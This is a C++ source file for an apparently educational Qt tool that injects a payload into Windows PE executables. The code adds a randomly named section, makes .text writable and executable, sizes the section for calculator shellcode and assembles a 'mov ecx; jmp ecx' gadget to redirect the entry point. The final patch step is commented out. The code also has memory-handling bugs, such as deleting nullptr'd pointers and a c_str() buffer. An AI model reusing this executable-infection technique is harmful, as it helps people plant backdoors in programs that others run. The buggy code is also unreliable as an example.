#include "morph_executable_controller.h"
#include "file_reader.h"
#include <stdio.h>

//constructor
Morph_Executable_Controller::Morph_Executable_Controller()
{
    this->cur_wind = MainWindow::getMWptr();
    this->buffer = std::vector<char>();
    this->file_name = QString("");
    this->file_path = QString("");
    this->exe_name = QString("");
    this->dos_header_pointer = nullptr;
    this->image_NT_header_ptr = nullptr;
    this->image_NT_header_file_cursor = 0;
    this->image_dos_header_file_cursor = 0;
    this->exe_header_file_offset = 0;
    this->entry_point_of_text_section = 0;
    this->file_alignment = 0;
    this->section_alignment = 0;
    this->text_section_raw_data_offset = 0;
    this->text_section_header_ptr = nullptr;
    this->size_of_text_section = 0;
    this->index_of_text_section = 0;
    this->index_of_payload_section = 0;
    this->payload_section_header_ptr = nullptr;
    this->payload_num_of_bytes = 0;
    this->file_alignment_factor = 0;
    this->payload_raw_data_size = 0;
    this->section_alignment_factor = 0;
    this->payload_virtual_size = 0;
    this->payload_raw_address = 0;
    this->payload_virtual_address = 0;
    this->machine_code_num_of_bytes = 0;
    this->entry_point_to_patch = 0;
    this->image_base = 0;
    this->section_pivot_gadget_byte_length = 0;
    this->text_section_buffer_ptr = nullptr;
    this->text_section_buffer_original = nullptr;

}

//destructor
Morph_Executable_Controller::~Morph_Executable_Controller()
{
    std::cout << "START OF DESTRUCTOR" << std::endl;

    std::cout << "1\n";
    this->dos_header_pointer = nullptr;
    delete this->dos_header_pointer;
    std::cout << "2\n";
    this->image_NT_header_ptr = nullptr;
    delete this->image_NT_header_ptr;
    std::cout << "3\n";
    this->text_section_header_ptr = nullptr;
    delete this->text_section_header_ptr;
    std::cout << "4\n";
    this->payload_section_header_ptr = nullptr;
    delete this->payload_section_header_ptr;
    std::cout << "5\n";
    delete[] this->text_section_buffer_ptr;
    std::cout << "6\n";
    delete[] this->text_section_buffer_original;
    std::cout << "7\n";
    for(int i = 0; i < this->image_section_header_vec.size(); i++)
    {
        delete this->image_section_header_vec[i];
        std:: cout << "7.5 ";
    }
     std::cout << "\n8\n";
    this->image_section_header_vec.clear();
     std::cout << "your mom" << std::endl;
     this->cur_wind = nullptr;
     delete this->cur_wind;

}

QString Morph_Executable_Controller::morph_exe_no_encryption(QString exe_file_path)
{
    QString status = "";
    //reading bytes of a exe file
    qDebug() << "STARTING MORPH ";
    status = read_file_into_vector(exe_file_path);
    if (status == ERROR_INVALID_EXECUTABLE)
    {
        QMessageBox::warning(cur_wind, "Warning",
                             "Invalid exe file: " + exe_file_path);
        return status;
    }
    //get image dos header pointer
    //image_dos_header_file_cursor is at offset 0 as this pe header is located at the first offset of the exe
    this->dos_header_pointer = get_ptr_image_dos_header(this->buffer,this->image_dos_header_file_cursor);

    //validate the image dos header must be equals to MZ(ASCII)
    if(!validate_image_dos_signature(dos_header_pointer))
    {
        QMessageBox::warning(cur_wind, "Warning",
                             "Invalid DOS Signature");

        status = ERROR_INVALID_DOS_SIGNATURE;
        return status;
    }

    // getting image_NT_header_cursor and setting exe_header_file_offset
    // Here we are assuming that buffer has the same bytes as the original file
    // so we need to get the exe_header_file_offset
    // which is the value of the e_lfanew attribute in dos_header_pointer
    this->image_NT_header_file_cursor = this->dos_header_pointer->e_lfanew;
    this->exe_header_file_offset = this->image_NT_header_file_cursor;

    // get the image_NT_header_ptr
    // the offset is at e_lfanew which is stored in image_NT_header_file_cursor
    this->image_NT_header_ptr = get_ptr_image_NT_header(this->buffer,image_NT_header_file_cursor);

    //validate the file PE signature must be equal to some dog shit
    if(!validate_PE_signature(image_NT_header_ptr))
    {
        QMessageBox::warning(cur_wind, "Warning",
                             "Invalid PE Signature");

        status = ERROR_INVALID_PE_SIGNATURE;
        return status;
    }

    printf("Before: Number of Sections : 0x%x\n", this->image_NT_header_ptr->FileHeader.NumberOfSections);
    //increasing the number of sections to allocate memory for payload
    this->image_NT_header_ptr->FileHeader.NumberOfSections += 1;
    printf("After: Number of Sections : 0x%x\n", this->image_NT_header_ptr->FileHeader.NumberOfSections);

    //randomizing the new payload section name
     const std::string payload_section_name = randomize_payload_section_name();

     //this is the entry point when the pe file is loaded to virtual memory
    //must add image base + the address of entry point
    this->entry_point_of_text_section = this->image_NT_header_ptr->OptionalHeader.ImageBase + this->image_NT_header_ptr->OptionalHeader.AddressOfEntryPoint;
    printf("ImageBase : 0x%x\nLoaded Entry point : 0x%x\n", this->image_NT_header_ptr->OptionalHeader.ImageBase, this->entry_point_of_text_section);

    //saving the file and section alignments in variables
    this->file_alignment =this->image_NT_header_ptr->OptionalHeader.FileAlignment;
    this->section_alignment = this->image_NT_header_ptr->OptionalHeader.SectionAlignment;

    // This cursor will be used to cycle through each section in the pe file
    // need to add exe file offset + the size of an IMAGE_NT_HEADERS32 struct to get to the first section
    unsigned int section_header_cursor = exe_header_file_offset + sizeof(IMAGE_NT_HEADERS32);

    //storing all image section headers inside a vector
    store_image_section_headers_in_vec(buffer, image_section_header_vec,
                                       image_NT_header_ptr, section_header_cursor);

    //getting the index of the .text section inside the image_section_header_vec
    status = get_section_header_index_by_name(TEXT_SECTION_NAME, image_section_header_vec,image_NT_header_ptr,index_of_text_section);
    if (status == ERROR_NO_MATCHING_SECTION_HEADER_NAME)
    {
        QMessageBox::warning(cur_wind, "Warning",
                             "No matching section header name for \".text\"");
        return status;
    }

    //getting the raw data offset of the .text section via image_section_header_vec
    //note that the above function saved the index of the .text section
    this->text_section_raw_data_offset = this->image_section_header_vec[this->index_of_text_section]->PointerToRawData;

    //storing the whole .text section inside the text_section_header_ptr
    this->text_section_header_ptr = this->image_section_header_vec[this->index_of_text_section];

    //getting the raw data size of the .text section via text_section_header_ptr
    this->size_of_text_section = this->text_section_header_ptr->SizeOfRawData;

    //setting the characteristics to read/write/execute
    this->text_section_header_ptr->Characteristics = SECTIONCHARACTERISTICSTOSET;

    //setting the payload section name from payload_section_name (randomized earlier),
    //which is at the end of the image_section_header_vec
    set_new_section_name(this->image_section_header_vec[this->image_section_header_vec.size()-1],
                           payload_section_name);


    //getting the index of the .payload section inside the image_section_header_vec
    status = get_section_header_index_by_name(payload_section_name, image_section_header_vec,
                                              image_NT_header_ptr,index_of_payload_section);
    if (status == ERROR_NO_MATCHING_SECTION_HEADER_NAME)
    {
        QMessageBox::warning(cur_wind, "Warning",
                             "No matching section header name for \".payload\"");
        return status;
    }

    //storing the whole .payload section inside the payload_section_header_ptr
    this->payload_section_header_ptr = image_section_header_vec[index_of_payload_section];

    //gets the index corresponding to the radio button
    int chosen_payload_index = get_payload_radio_button();


    switch(chosen_payload_index)
    {
        case 0:
            this->payload_num_of_bytes = sizeof(CALC_SHELLCODE) - 1; //the -1 is to get rid of terminating character
            break;

        default:
            break;
    }

    //calculate the file alignment factor to align the section
    calculate_file_alignment_factor(this->payload_num_of_bytes,this->file_alignment,this->file_alignment_factor);

    //calculate the payload raw data size via file_alignment
    this->payload_raw_data_size = this->file_alignment_factor * this->file_alignment;

    //calculate the section alignment factor for the section
    //needs the virtual size of the section before the payload section for calculation
    calculate_section_alignment_factor(payload_num_of_bytes,section_alignment,section_alignment_factor,
                                       image_section_header_vec[index_of_payload_section-1]);

    //calculate payloads virtual size via section alignment
    this->payload_virtual_size = this->section_alignment_factor * this->section_alignment;

    //calculate payloads raw address
    //previous raw size + previous raw data offset
    this->payload_raw_address = image_section_header_vec[index_of_payload_section-1]->SizeOfRawData
                                + image_section_header_vec[index_of_payload_section-1]->PointerToRawData;

    //calculate the payloads va
    //previous virtual address + payloads virtual size
    this->payload_virtual_address = image_section_header_vec[index_of_payload_section-1]->VirtualAddress
                                    + this->payload_virtual_size;

    //setting the relevant values in the new payload section header via payload_section_header_ptr
    init_payload_section_header(this->payload_section_header_ptr,
                                this->payload_raw_address,
                                this->payload_raw_data_size,
                                this->payload_virtual_address,
                                this->payload_virtual_size,
                                this->SECTIONCHARACTERISTICSTOSET);

    //setting the new size of the pe file
    //via image_NT_header_ptr by adding on the payload_virtual_size
    this->image_NT_header_ptr->OptionalHeader.SizeOfImage += this->payload_virtual_size;

    //this is the section pivot gadget for the payload section,
    //which is used to patch back the .text section
    this->entry_point_to_patch = this->image_NT_header_ptr->OptionalHeader.AddressOfEntryPoint -
                                    this->image_NT_header_ptr->OptionalHeader.BaseOfCode +
                                    this->text_section_raw_data_offset;

    //getting image base via image_NT_header_ptr optional header
    this->image_base = this->image_NT_header_ptr->OptionalHeader.ImageBase;

    //writing assembly syntax, for entry point patching (section pivot gadget), into string
    std::string section_pivot_gadget_asm = "mov ecx, ";
    section_pivot_gadget_asm += convert_num_to_hex<DWORD>(this->image_base + this->payload_virtual_address) + ";";
    section_pivot_gadget_asm += "jmp ecx;";


    //converting assembly syntax into machine code
    const char* section_pivot_gadget_char = section_pivot_gadget_asm.c_str();
        std::cout << "BEFORE ASSEMBLING" << std::endl;
    this->machine_code_vec.clear();
            std::cout << "BEFORE ASSEMBLING2" << std::endl;
    status = asm_to_machine_code(section_pivot_gadget_char,this->machine_code_vec,this->machine_code_num_of_bytes);
    if(status != SUCCESS_ASSEMBLY_TO_MACHINE_CODE_KEYSTONE)
    {
        std::cout << "ERROR" << std::endl;
    }
    std::cout << "AFTER ASSEMBLING" << std::endl;

    delete section_pivot_gadget_char;//deleting the char*


    //storing the byte length of the section pivot gadget
    this->section_pivot_gadget_byte_length = this->machine_code_num_of_bytes;


    this->text_section_buffer_original = get_section_data_from_buffer(this->buffer,
                                                                      this->text_section_raw_data_offset,
                                                                      this->size_of_text_section);
    this->text_section_buffer_ptr = this->text_section_buffer_original;

    /*
    char* fileTextSectionBuffer = getTextSectionDataFromFileBuffer(buffer, RawDataOffsetTextSection, textSectionSize);
    char * fileTextSectionBufferPtr = fileTextSectionBuffer;
    for (int i = 0; i < sectionPivotGadgetLength; i++)
    {
        *(fileTextSectionBufferPtr + (patchingEntryPoint - RawDataOffsetTextSection)) = encode[i];
        fileTextSectionBufferPtr++;
    }

    populateSectionNBuffer(fileTextSectionBufferPtr, reinterpret_cast<char*>(encode.data()), sectionPivotGadgetLength);
    */

    //print_section_headers(image_section_header_vec);

    std::cout << std::endl;
    std::cout << "its over" << std::endl;

    return SUCCESS_MORPHED_EXECUTABLE;
}

//morphing section supporting/utility functions
QString Morph_Executable_Controller::read_file_into_vector(QString exe_file_path)
{
    File_Reader reader;
    return reader.read_file_into_vector(exe_file_path,this->buffer);
}

PIMAGE_DOS_HEADER Morph_Executable_Controller::get_ptr_image_dos_header(std::vector<char> &buffer, unsigned int image_dos_header_file_cursor)
{
    char* extracted_dos_header = new char[sizeof(IMAGE_DOS_HEADER)];

    for (int i = 0; i < sizeof(IMAGE_DOS_HEADER); i++)
    {
        extracted_dos_header[i] = buffer[image_dos_header_file_cursor + i];
    }
    return (PIMAGE_DOS_HEADER)extracted_dos_header;
}

bool Morph_Executable_Controller::validate_image_dos_signature(PIMAGE_DOS_HEADER &dos_header_pointer)
{
    return (dos_header_pointer->e_magic == IMAGE_DOS_SIGNATURE);
}

PIMAGE_NT_HEADERS32 Morph_Executable_Controller::get_ptr_image_NT_header(std::vector<char>&buffer, unsigned int image_NT_header_file_cursor)
{
    char *extracted_NT_header = new char[sizeof(IMAGE_NT_HEADERS32)];

    for (int i = 0; i < sizeof(IMAGE_NT_HEADERS32); i++)
    {
        extracted_NT_header[i] = buffer[image_NT_header_file_cursor + i];
    }
    return (PIMAGE_NT_HEADERS32)extracted_NT_header;
}

bool Morph_Executable_Controller::validate_PE_signature(PIMAGE_NT_HEADERS32 &image_NT_header_ptr)
{
    return (image_NT_header_ptr->Signature == IMAGE_NT_SIGNATURE);
}

std::string Morph_Executable_Controller::randomize_payload_section_name()
{
    srand(time(NULL));
    std::string alpha_num =  "0123456789"; // numbers
    alpha_num +=             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"; // uppercase letters
    alpha_num +=             "abcdefghijklmnopqrstuvwxyz"; // lowercase letters

    //new payload section must start with '.' character
    std::string name = ".";
    // randomization here
    for (int i = 1; i < IMAGE_SIZEOF_SHORT_NAME; i++)
    {
        name += alpha_num[rand() % (alpha_num.length())];
    }

    return name;
}

void Morph_Executable_Controller::store_image_section_headers_in_vec(std::vector<char> &buffer, std::vector<PIMAGE_SECTION_HEADER> &image_section_header_vec,
                                                                     PIMAGE_NT_HEADERS32& image_NT_header_ptr, unsigned int section_header_cursor)
{
    for (int i = 0; i < image_NT_header_ptr->FileHeader.NumberOfSections; i++)
    {
        image_section_header_vec.push_back(get_ptr_image_section_header(buffer, section_header_cursor + i * sizeof(IMAGE_SECTION_HEADER)));
        //printf("Name : %s\n", image_section_header_vec[i]->Name);
    }
}

PIMAGE_SECTION_HEADER Morph_Executable_Controller::get_ptr_image_section_header(std::vector<char> &buffer, unsigned int section_header_cursor)
{
    char *extracted_NT_header = new char[sizeof(IMAGE_SECTION_HEADER)];

    for (int i = 0; i < sizeof(IMAGE_SECTION_HEADER); i++)
    {
        extracted_NT_header[i] = buffer[section_header_cursor + i];
    }

    return (PIMAGE_SECTION_HEADER)extracted_NT_header;
}

QString Morph_Executable_Controller::get_section_header_index_by_name(const std::string section_name, std::vector<PIMAGE_SECTION_HEADER> &image_section_header_vec, PIMAGE_NT_HEADERS32 &image_NT_header_ptr, int &index_of_text_section)
{
    for (int i = 0; i < image_NT_header_ptr->FileHeader.NumberOfSections; i++)
    {
        if (section_name.compare((char*)image_section_header_vec[i]->Name) == 0)
        {
            index_of_text_section = i;
            return SUCCESS_MATCHING_SECTION_HEADER_NAME;
        }
    }
    return ERROR_NO_MATCHING_SECTION_HEADER_NAME;
}

void Morph_Executable_Controller::set_new_section_name(PIMAGE_SECTION_HEADER &payload_section, const std::string payload_section_name)
{
    for(int i = 0; i < payload_section_name.length(); i++)
    {
        payload_section->Name[i] =  payload_section_name[i];
    }
}

int Morph_Executable_Controller::get_payload_radio_button()
{
    QString payload_type = this->cur_wind->get_payload_radio_button();

    for(int i = 0; i < PAYLOADS_VEC.size(); i++)
    {
        if(payload_type == PAYLOADS_VEC[i])
        {
            return i;
        }
    }

    return -1;
}

void Morph_Executable_Controller::calculate_file_alignment_factor(unsigned int &payload_num_of_bytes,
                                                                  DWORD &file_alignment,unsigned int &file_alignment_factor)
{
    file_alignment_factor = payload_num_of_bytes / file_alignment;
    if(payload_num_of_bytes % file_alignment != 0)
    {
        file_alignment_factor++;
    }
}

void Morph_Executable_Controller::calculate_section_alignment_factor(unsigned int &payload_num_of_bytes,
                                                                  DWORD &section_aligment,unsigned int &section_alignment_factor,
                                                                     PIMAGE_SECTION_HEADER &previous_section_header_ptr)
{
    section_alignment_factor = payload_num_of_bytes / section_aligment;
    unsigned int previous_virtual_size = previous_section_header_ptr->Misc.VirtualSize;
    if(previous_virtual_size % section_aligment != 0)
    {
        section_alignment_factor++;
    }
}

void Morph_Executable_Controller::init_payload_section_header(PIMAGE_SECTION_HEADER &payload_section_header_ptr,
                                                              unsigned int &payload_raw_address,
                                                              unsigned int &payload_raw_data_size,
                                                              unsigned int &payload_virtual_address,
                                                              unsigned int &payload_virtual_size,
                                                              DWORD SECTIONCHARACTERISTICSTOSET)
{
    payload_section_header_ptr->PointerToRawData = payload_raw_address;
    payload_section_header_ptr->SizeOfRawData = payload_raw_data_size;
    payload_section_header_ptr->VirtualAddress = payload_virtual_address;
    payload_section_header_ptr->Misc.VirtualSize = payload_virtual_size;
    payload_section_header_ptr->Characteristics = SECTIONCHARACTERISTICSTOSET;
}

//this is to print the relevant information of each section header
//TODO : For e learning, put inside analysis text box or some shit
void Morph_Executable_Controller::print_section_headers(std::vector<PIMAGE_SECTION_HEADER> &image_section_header_vec)
{
    std::cout << "PRINTING IMAGE SECTION HEADERS" << std::endl;
    std::cout << "===============================\n" << std::endl;
    for (auto i = 0; i < image_section_header_vec.size(); i++)
    {
        printf("NAME : %s\n", image_section_header_vec[i]->Name);
        printf("Virtual Size : 0x%x\n", image_section_header_vec[i]->Misc.VirtualSize);
        printf("Virtual Address : 0x%x\n", image_section_header_vec[i]->VirtualAddress);
        printf("Size of Raw Data : 0x%x\n", image_section_header_vec[i]->SizeOfRawData);
        printf("Pointer to Raw Data : 0x%x\n", image_section_header_vec[i]->PointerToRawData);
        printf("Pointer to Relocations : 0x%x\n", image_section_header_vec[i]->PointerToRelocations);
        printf("Pointer to Line Numbers : 0x%x\n", image_section_header_vec[i]->PointerToLinenumbers);
        printf("Number of Relocations: 0x%x\n", image_section_header_vec[i]->NumberOfRelocations);
        printf("Number of Line Numbers: 0x%x\n", image_section_header_vec[i]->NumberOfLinenumbers);
        printf("Charactertistics 0x%x\n", image_section_header_vec[i]->Characteristics);
        printf("-----------------------\n\n");
    }
}

QString Morph_Executable_Controller::asm_to_machine_code(const char * code, std::vector<unsigned char>& machine_code, size_t &machine_code_num_of_bytes)
{
    std::cout << "asm1\n";

    ks_engine* ks;
    ks_err err;
    size_t count = 0;
    unsigned char *encode;
    err = ks_open(KS_ARCH_X86, KS_MODE_32, &ks);
    std::cout << "asm2\n";
    if (err != KS_ERR_OK)
    {
        printf("ERROR: failed on ks_open(), quit\n");
        return ERROR_OPENING_KEYSTONE;
    }
    if (ks_asm(ks, code, 0, &encode, &machine_code_num_of_bytes, &count) != KS_ERR_OK)
    {
        printf("ERROR: ks_asm() failed & count = %lu, error = %u\n",
            count, ks_errno(ks));
        return ERROR_ASSEMBLY_FAILED_KEYSTONE;
    }
    else
    {
        printf("%s = ", code);
        for (int i = 0; i < machine_code_num_of_bytes; i++)
        {
            printf("%02x ", encode[i]);
            machine_code.push_back(encode[i]);
        }
        printf("\n");
        printf("Compiled: %lu bytes, statements: %lu\n", machine_code_num_of_bytes, count);
    }

    // NOTE: free encode after usage to avoid leaking memory
    ks_free(encode);

    // close Keystone instance when done
    ks_close(ks);
    return SUCCESS_ASSEMBLY_TO_MACHINE_CODE_KEYSTONE;

}

char* Morph_Executable_Controller::get_section_data_from_buffer(std::vector <char> &buffer, unsigned int file_offset, unsigned int size_of_section)
{
    char* section = new char[size_of_section];
    for (int i = 0; i < size_of_section; i++)
    {
        section[i] = buffer[file_offset + i];
    }
    return section;
}
